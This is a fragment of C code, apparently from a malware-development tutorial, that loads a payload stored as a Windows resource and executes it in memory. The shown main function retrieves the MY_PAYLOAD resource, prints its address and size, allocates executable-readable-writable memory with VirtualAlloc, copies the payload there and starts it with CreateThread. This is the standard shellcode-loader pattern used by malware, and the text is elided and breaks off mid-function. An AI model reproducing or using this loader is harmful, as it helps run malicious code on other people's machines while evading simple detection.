...
int main() {
	...
	if (!GetResourceData(GetModuleHandle(NULL), MY_PAYLOAD, &ppResourceRawData, &psResourceDataSize)) {
		return -1;
	}

	printf("[i] ppResourceRawData  : 0x%p \n[i] psResourceDataSize : %d \n", ppResourceRawData, psResourceDataSize);

	system("PAUSE");

	PVOID pAddress = VirtualAlloc(NULL, psResourceDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(pAddress, ppResourceRawData, psResourceDataSize);
	CreateThread(NULL, 0, pAddress, NULL, NULL, NULL);
